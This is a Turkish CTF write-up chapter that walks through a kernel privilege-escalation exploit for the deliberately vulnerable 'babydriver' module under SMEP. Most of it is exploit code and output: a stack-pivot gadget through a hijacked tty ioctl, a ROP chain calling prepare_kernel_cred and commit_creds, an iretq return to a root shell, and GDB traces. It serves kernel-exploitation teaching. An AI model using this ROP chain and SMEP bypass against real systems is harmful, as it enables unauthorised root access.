# Hedefimiz
Bu bölümdeki hedefimiz, önceki bölümdeki exploit'imizin, SMEP ile çalışmasını sağlamak olacak.

Eğer önceki bölümde, QEMU scriptinden kaldırdığımız SMEP opsiyonunu:
```bash
-cpu kvm64
```
Geri eklerseniz:
```bash
-cpu kvm64,+smep
```
Makineyi yeniden başlatıp exploit'i denediğinizde, ilginç bir panik mesajı alacaksınız:
```
/ $ ./exploit_no_smep.elf
[    4.469995] device open
[    4.479609] device open
[    4.484902] alloc done
[    4.488670] device release

0000: 0x00 0x98 0xb6 0x02 0x00 0x88 0xff 0xff 0x60 0x35
0010: 0xb2 0x02 0x00 0x88 0xff 0xff 0x00 0x00 0x00 0x00
...
0720: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0730: 0x00 0x00 0x00 0x00 0x00

0000: 0x01 0x54 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00
0010: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5f 0x9f 0x02
...
0720: 0xd0 0x9d 0x4d 0x81 0xff 0xff 0xff 0xff 0x00 0xa8
0730: 0x9f 0x00 0x00 0x88 0xff
obtained the tty_struct
new close: 0x4011e5
[    5.261105] unable to execute userspace code (SMEP?) (uid: 1000)
[    5.264181] BUG: unable to handle kernel paging request at 00000000004011e5
[    5.264181] IP: [<00000000004011e5>] 0x4011e5
[    5.264181] PGD 2b65067 PUD 2b80067 PMD 2b81067 PTE 3309025
[    5.264181] Oops: 0011 [#1] SMP
[    5.264181] Modules linked in: babydriver(OE)
[    5.264181] CPU: 0 PID: 89 Comm: exploit_no_smep Tainted: G           OE   4.4.72 #1
[    5.264181] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.16.3-1-1 04/01/2014
[    5.264181] task: ffff880002b4b300 ti: ffff880000a10000 task.ti: ffff880000a10000
[    5.264181] RIP: 0010:[<00000000004011e5>]  [<00000000004011e5>] 0x4011e5
[    5.264181] RSP: 0018:ffff880000a13de8  EFLAGS: 00010202
[    5.264181] RAX: 00000000004011e5 RBX: ffff880002b69000 RCX: 0000000000000000
[    5.264181] RDX: 0000000000000000 RSI: ffff880002b6a300 RDI: ffff880002b69000
[    5.264181] RBP: ffff880000a13e58 R08: ffff880002b6a300 R09: 0000000000000000
[    5.264181] R10: ffff8800029ee2e8 R11: 0000000000000246 R12: ffff880002b6a300
[    5.264181] R13: ffff8800029ee2e8 R14: ffff880002b511a0 R15: ffff880002b69800
[    5.264181] FS:  0000000000408758(0063) GS:ffff880003c00000(0000) knlGS:0000000000000000
[    5.264181] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.264181] CR2: 00000000004011e5 CR3: 0000000002b82000 CR4: 00000000001006f0
[    5.264181] Stack:
[    5.264181]  ffffffff814d97c5 0000000000000000 ffff880002b38021 0000000000000000
[    5.264181]  0000000100000001 0000000000000000 0000000000000000 ffff880000a13e50
[    5.264181]  5bb30bd3549f472f ffff880002b6a300 0000000000000010 ffff8800029ee2e8
[    5.264181] Call Trace:
[    5.264181]  [<ffffffff814d97c5>] ? tty_release+0x105/0x580
[    5.264181]  [<ffffffff8120d2c4>] __fput+0xe4/0x220
[    5.264181]  [<ffffffff8120d43e>] ____fput+0xe/0x10
[    5.264181]  [<ffffffff8109dcf1>] task_work_run+0x81/0xa0
[    5.264181]  [<ffffffff81003242>] exit_to_usermode_loop+0xc2/0xd0
[    5.264181]  [<ffffffff81003c6e>] syscall_return_slowpath+0x4e/0x60
[    5.264181]  [<ffffffff81819d90>] int_ret_from_sys_call+0x25/0x8f
[    5.264181] Code:  Bad RIP value.
[    5.264181] RIP  [<00000000004011e5>] 0x4011e5
[    5.264181]  RSP <ffff880000a13de8>
[    5.264181] CR2: 00000000004011e5
[    5.473067] ---[ end trace 7f6c647a19049372 ]---
[    5.478543] Kernel panic - not syncing: Fatal exception
[    5.482503] Kernel Offset: disabled
```
Gördüğünüz gibi, instruction pointer'ı, sahte `close()` çağrımızda. Ve bu adres, `CR2`yi kontrol ederek doğrulayabileceğimiz gibi, page fault'a
sebebiyet vermiş gibi görünüyor.

### Neden Çalışmıyor?
[intro](intro.md)'da bahsetiğimiz gibi, SMEP ring 0'da çalışırken user sayflarında kod çalıştırmamızı önlüyor. Bu sebeple sahte `close()` çağrımız
user sayfasında olan bir çağrı olarak, ring 0'dan çağrıldığında SMEP devreye giriyor ve bir page fault'a sebebiyet veriyor.

Yine intro'da bahsetiğimiz gibi, bu eski bir kernel olduğundan, `CR4`i modifiye ederek SMEP'i kapatmamız mümkün, ancak **güncel kernel'lerde bu mümkün değil**,
bu sebepten ben diğer yönetimi kullanıyor olacağım, tüm exploiti: ROP ile taşımak.

Ama nasıl ROP yapabiliriz ki? Sadece `rip`i bir kere kontrol ediyoruz? Aslında gayet basit, `rsp`yi modifiye edebilirsek bunu yapabiliriz.

Fakat `close()` çağrısı bunun için pek ideal değil, çünkü `rsp`yi istediğimiz adrese modifiye edebilmemiz için, bir register'ı korumamız gerekecek.
Bunu argümanlar aracılığı ile yapabiliriz, ancak `close()` hiçbir argüman kabül etmiyor. `ioctl()` iyi bir seçenek, iki register'ı koruyor, ve üçüncü argümanı,
bir long veri tipi kullandığı için, kernel'in bu fonksiyonu çağrırken register'ın hepsini koruyacağından emin olabiliriz.

Fakat bu başka bir sorunu ortaya çıkarıyor, hatırlarsanız, `close()`u seçmemizin sebebi, her türlü çağrılacak olmasıydı. **Aslında yalan söyledim**, `tty_struct`ın
`magic` değeri bozulursa, kernel'in `tty_struct`ın fonksiyonlarını çağırmadan önce [`tty_paranoia_check()`](https://elixir.bootlin.com/linux/v4.4.72/source/drivers/tty/tty_io.c#L259)
ile yaptığı kontrol başarısız olacak ve `close()` çağrılmayacaktır. Tabi `magic`i biz doğrudan bozmuyoruz, ancak hatırlarsanız, `babydriver`, `close()`
dan kaynaklı, UAF olarak kullandığı belleği serbest bırakıyor. Bu serbest bırakma sonucu `magic` bozulacaktır. Ve `babydriver`ın `close()` çağrısı,
`/dev/babydev` daha önce açıldığından, her zaman `tty_struct`ın `close()`undan daha önce çalışacaktır.

**Eğer `tty_struct`ın `magic` değerine sahip olmadığı, daha yeni bir kernelde olsaydık**, basitçe `tty_struct`ın UAF ile aldığımız orjinal belleğini
kaydedip, en sonunda tekrar UAF ile geri yazabilirdik. Bu sayede `tty_struct`ın orjinal `close()` çağrısı kullanılırdı.

Her neyse, `ioctl()`i sorunsuz olarak kullanabilceğimizi anladığımıza göre, devam edebiliriz.

Şimdi bize `ioctl()`in, üçüncü argümanı aracılığı ile (`rdx`), `rsp`yi değiştirebileceğimiz güzel bir gadget lazım. Bunun için kernel'de gadget'lar çıkartmamız
lazım. Tabi direk `bzImage`den gadget çıkartamayız, hatırlarsanız `bzImage` bir binary dosyası değil. `bzImage`dan `vmlinux`u çıkarmak için, kernel tree'sindeki
[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) script'ini kullanabiliriz:
```bash
extract-vmlinux bzImage > vmlinux
```
Ardından `ROPGadget` ile gadget'ları alabiliriz:
```bash
ROPgadget --binary vmlinux > gadgets
```
`rdx`i doğrudan `rsp`ye taşıyacak birşey bulmamız zor, ama deneyebiliriz:
```
ngn@blackarch:~/Desktop/ncstisc/babydriver# grep 'mov rdx, rsp' gadgets
0xffffffff810b1f38 : adc al, 0x24 ; mov rdx, rsp ; jmp 0xffffffff810b1ef6
0xffffffff810b1f35 : add byte ptr [rax + 1], cl ; adc al, 0x24 ; mov rdx, rsp ; jmp 0xffffffff810b1ef6
0xffffffff810b1f34 : add byte ptr [rax], al ; add qword ptr [rsp], rdx ; mov rdx, rsp ; jmp 0xffffffff810b1ef6
0xffffffff810b1f37 : add dword ptr [rsp], edx ; mov rdx, rsp ; jmp 0xffffffff810b1ef6
0xffffffff810b1f36 : add qword ptr [rsp], rdx ; mov rdx, rsp ; jmp 0xffffffff810b1ef6
0xffffffff810b1f3a : mov rdx, rsp ; jmp 0xffffffff810b1ef6
```
Hmm, şansız. Belki de stack'i kullanan birşeyler bulabiliriz:
```
ngn@blackarch:~/Desktop/ncstisc/babydriver# grep 'push rdx' gadgets | grep 'pop rsp'
0xffffffff816b316a : push rdx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
0xffffffff811cc03a : push rdx ; and edx, ecx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff81154d2a : push rdx ; mov edx, 0x415b0028 ; pop rsp ; pop rbp ; ret
0xffffffff812528b5 : push rdx ; pop rsp ; add bl, ch ; mov ebp, 0xe2d611e8 ; call qword ptr [rax + 0x5c9a2be8]
```
`0xffffffff81154d2a` harika bir seçenek gibi görünüyor. Şimdi yapmamız gereken, geçeceğimiz sahte stack'i oluşturmak, bunun için exploit'imizde,
basitçe bir karakter dizesi oluşturabiliriz:
```c
uint64_t stack[0x100], i = 0;
```
Gadget'ımız, `rsp`yi değiştirdikten sonra ek olarak `rbp`yi pop'latıyor, bunu stack'imize eklememiz gerekecek:
```c
stack[i++] = 0x42; // rbp
```
Son olarak `close()` çağrısı yerine `ioctl()` çağrısını modifye edip, gadget'ımzı yerleştirmemiz lazım:
```c
ops.ioctl = (void *)0xffffffff81154d2a; // push rdx ; mov edx, 0x415b0028 ; pop rsp ; pop rbp ; ret
printf("new ioctl: %p\n", ops.ioctl);
tty->ops = (void *)&ops;
```
Şimdi `/dev/ptmx` üzerinde `ioctl()`i üçüncü argümanımız (`rdx`), `stack` ile çağırdığımızda, gadget'ımız
`rsp`yi `stack`in adresi ile değiştirecektir:
```c
ioctl(fd1, 0, stack);
```
bunu GDB'de, gadget'ımıza bir breakpoint yerleştirip görebiliriz:
```
(gdb) b *0xffffffff81154d2a
Breakpoint 1 at 0xffffffff81154d2a
(gdb) c
Continuing.

Breakpoint 1, 0xffffffff81154d2a in ?? ()
(gdb) x/10i $rip
=> 0xffffffff81154d2a:	push   %rdx
   0xffffffff81154d2b:	mov    $0x415b0028,%edx
   0xffffffff81154d30:	pop    %rsp
   0xffffffff81154d31:	pop    %rbp
   0xffffffff81154d32:	ret
   0xffffffff81154d33:	nopl   (%rax)
   0xffffffff81154d36:	cs nopw 0x0(%rax,%rax,1)
   0xffffffff81154d40:	push   %rbp
   0xffffffff81154d41:	mov    %rsp,%rbp
   0xffffffff81154d44:	push   %r13
(gdb) p/x $rdx
$1 = 0x7ffc3772e720
(gdb) si
0xffffffff81154d2b in ?? ()
(gdb) si
0xffffffff81154d30 in ?? ()
(gdb) si
0xffffffff81154d31 in ?? ()
(gdb) x/10i $rip
=> 0xffffffff81154d31:	pop    %rbp
   0xffffffff81154d32:	ret
   0xffffffff81154d33:	nopl   (%rax)
   0xffffffff81154d36:	cs nopw 0x0(%rax,%rax,1)
   0xffffffff81154d40:	push   %rbp
   0xffffffff81154d41:	mov    %rsp,%rbp
   0xffffffff81154d44:	push   %r13
   0xffffffff81154d46:	push   %r12
   0xffffffff81154d48:	push   %rbx
   0xffffffff81154d49:	mov    0x1020(%rdi),%r12d
(gdb) p/x $rsp
$2 = 0x7ffc3772e720
(gdb) x/10gx $rsp
0x7ffeb96d5ee0:	0x0000000000000042	0x0000000000000000
0x7ffeb96d5ef0:	0x0000000000000000	0x0000000000000000
0x7ffeb96d5f00:	0x0000000000000000	0x0000000000000000
0x7ffeb96d5f10:	0x0000000000000000	0x0000000000000000
0x7ffeb96d5f20:	0x0000000000000000	0x0000000000000000
```

# Exploit
Artık stack'i kontrol ettiğimize göre, ROP gerçekleştirebiliriz. Tabi en son user-mode'a dönmemiz gerekecek. Fakat öncesinde,
kernel'den ayrılmadan root almamız lazım.

Bunun için önce `prepare_kernel_cred()`i çağırıp, dönüş değeri ile `commit_creds()`i çağırmamız lazım, bunun için, `vmlinux`dan çıkardığımız
gadgetlar ile bir ROP oluşturup, exploit'imizde, stack'e ekleyebiliriz:
```c
stack[i++] = 0xffffffff810d238d;  // pop rdi ; ret
stack[i++] = 0;                   // rdi
stack[i++] = PREPARE_KERNEL_CRED; // prepare_kernel_cred()
stack[i++] = 0xffffffff8133b32e;  // mov rdi, rax ; mov rax, rdi ; pop rbx ; pop rbp ; ret
stack[i++] = 0;                   // rbx
stack[i++] = 0;                   // rbp
stack[i++] = COMMIT_CREDS;        // commit_creds()
```
Şimdi user-mode'a dönme zamanı. Bunu yapmak aslında çok zor değil, fakat öncesinde, kernel'in user-mode ile kernel-mode arasında
geçiş yaparken, GS register'ını değiştirmemiz gerekecek. `swapgs` instrunction'ı bunun için kullanılıyor.

Basitçe `swapgs`i çağırdığınızda, işlemci GS'i özel bir model-spesifik register'a (MSR) saklıyor. Linux bu özelliği işlemcinin durumuna özel bazı şeyleri
tutmak için saklıyor. Bu sebepten ötürü, her kernel ve user mod arasında geçiş yaparaken, kernel `swapgs` çalıştırıyor. Bizim bu noktada, user-mode'a geri
dönmek için `swapgs` çalıştırmamıza gerek yok, ancak bu durumda aynı işlemci çekirdeği, tekrar kernel-mode'a geçiş yaptığında, kernel `swapgs` çalıştırıp
bu işlemci durumu hakkındaki bilgilere GS ile erişmeye çalışacağından, biz şuan `swapgs` çalıştırmazsak, istemeden user-mode GS register'ını kullanacaktır.

`swapgs` için basit bir gadget bulup ROP zincirimize ekleyebiliriz:
```
stack[i++] = 0xffffffff81063694;  // swapgs ; pop rbp ; ret
stack[i++] = 0;                   // rbp
```
Şimdi user-mode'a geçmemiz lazım. Bunun için CS ve SS segment selector register'larını, user-mode değerlere işaret edecek şekilde değiştirmeliyiz. Bu segment
selector'leri [intro](intro.md)'da bahsetiğimiz gibi, farklı bellek alanlarının hangi ring tarafından erişilebilir olduğu belirtir. Bu bellek alanları hakkında
bilgi, "descriptor table" dediğimiz tablolar mevcut, ve bu segment regitser'ları o tablolara indexlemek için kullanılır.

Bu iki register'ı değiştirmemizi sağlayan güzel bir instruction, `iret` yani interrupt return instrunction'ıdır. 64 bit versiyonu `iretq`.

[Farklı donanım ve yazılım interrupt'ları](https://wiki.osdev.org/Interrupts) ortaya çıkınca, işlemci kernel tarafından belirtilen interrupt handler koduna atlamadan
önce, stack'e "interrupt frame" olarak belirtilen bir frame yerleştirir. Bu frame, sırasıyla, (interrupt bir hata koduna sahip exception değilse) `ss`, `rsp`, `rflags`,
`cs` ve `rip` register'larını içerir. Interrupt handler, işlemcinin kaldığı yere dönebilmesi için `iretq` instrunction'ı nı kullanır. Sıradan `ret` her nasıl stack'den
`rip`i pop'latıp o adrese dönüyorsa, `iretq` da sırasıyla bu değerleri pop'latır. Bir örnek olarak, 
[üzerinde çalıştığım bir işletim sisteminin interrupt handler'ına](https://github.com/ngn13/sdx/blob/52a942c4852d9316b684e6f4acc95dee006d9420/kernel/core/im/handler.S#L104)
bakabilirsiniz. Belki bu şekilde anlaması daha kolay olabilir.

Yani stack'imize bir interrupt frame'i yerleştirip `iretq` çalıştırarak, gerekli segment selector register'larını değiştirip bir user-mode fonksiyonuna dönebiliriz.
Tabiki de bunu yapmak için, tüm bu interrupt frame'de kullanılan önemli register'ları user-mode'da iken kaydetmemiz gerekecektir. Bunu exploit'imize, `stack`de ROP'un
inşasına başlamadan önce yapabiliriz:
```c
uint64_t user_ss, user_rsp, user_rflags, user_cs;

__asm__("mov %%ss, %0\n"
      "mov %%rsp, %1\n"
      "pushfq\n"
      "pop %2\n"
      "mov %%cs, %3\n"
      : "=r"(user_ss), "=m"(user_rsp), "=r"(user_rflags), "=r"(user_cs));
```
Burada aslında `rsp`yi kaydetmemize gerek yok, yine oluşturduğumuz `stack` karakter dizesini kullanabiliriz. Yine de farketmez, zaten user-mode'da atladıktan sonra,
sadece `execve` vs. çalıştırabilmek için geçici bir stack'e ihtiyacımız olacak, sonuçta `return` çalıştırıp ve programın normal akışına devam ediyor olmayacağız.

Tabi dönüş yapacağımız bir yer de lazım, exploit'e, `shell()` isimli basitçe root aldığımızdan emin olup bize shell verecek bir fonksiyon ekledim:
```c
void shell() {
  if (getuid() != 0)
    puts("exploit failed :(");

  else {
    puts("exploit was successful, popping a shell");
    char *args[] = {"/bin/sh", NULL, NULL};
    execve("/bin/sh", args, NULL);
    perror("execve failed");
  }

  exit(1);
}
```
Şimdi `iretq` gadget'ına ihtiyacımız olacak. Neden bilmiyorum ama `ROPGadget`, `iretq` gadget'ları içermiyor. Ama sorun yok, zaten doğrudan `iretq`ya atlayacağımız
için, `objdump` ile bir tane bulabiliriz:
```
ngn@blackarch:~/Desktop/ncstisc/babydriver# objdump -d vmlinux | grep iretq
ffffffff8181a797:	48 cf                	iretq
```
Bunu interrupt frame'i ile beraber, exploit'imize ekleyebiliriz:
```c
stack[i++] = 0xffffffff8181a797;  // iretq
stack[i++] = (uint64_t)shell;     // shell()
stack[i++] = user_cs;             // cs
stack[i++] = user_rflags;         // rflags
stack[i++] = user_rsp;            // rsp
stack[i++] = user_ss;             // ss
```
Ve bunların eklemelerin hepsi beraber, kaynak koduna [burdan ulaşabileceğiniz](../src/babydriver/exploit.c) tam exploit'imizi oluşturuyor.

Şimdi, exploit'i deneme zamanı:
```
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ ./exploit.elf 
[    4.546964] device open
[    4.561529] device open
[    4.571889] alloc done
[    4.578510] device release

0000: 0x00 0xf8 0xb6 0x02 0x00 0x88 0xff 0xff 0xa0 0x5d 
0010: 0x9e 0x00 0x00 0x88 0xff 0xff 0x00 0x00 0x00 0x00 
...
0720: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 
0730: 0x00 0x00 0x00 0x00 0x00 

0000: 0x01 0x54 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 
0010: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5f 0x9f 0x02 
...
0720: 0xd0 0x9d 0x4d 0x81 0xff 0xff 0xff 0xff 0x00 0x48 
0730: 0xb4 0x02 0x00 0x88 0xff 
obtained the tty_struct
new ioctl: 0xffffffff81154d2a
using gadget to switch to 0x7fff3bb9b770
should return to shell() at 0x4011e5
exploit was successful, popping a shell
/ # id
uid=0(root) gid=0(root)
/ #
```

Güzel, gördüğünüz gibi son exploit'e yeni stack'in adresini basması için bir `printf()` ekledim. Dilerseniz `ioctl()` için kullandığımız gadget'a
bir breakpoint yerleştirip, ROP'u takip ederek stack'in değişmesini ve `shell()`in çağrılmasını adım adım takip edebilirsiniz.

---
[Önceki](babydriver_no_smep.md) | [Sonraki](end.md)
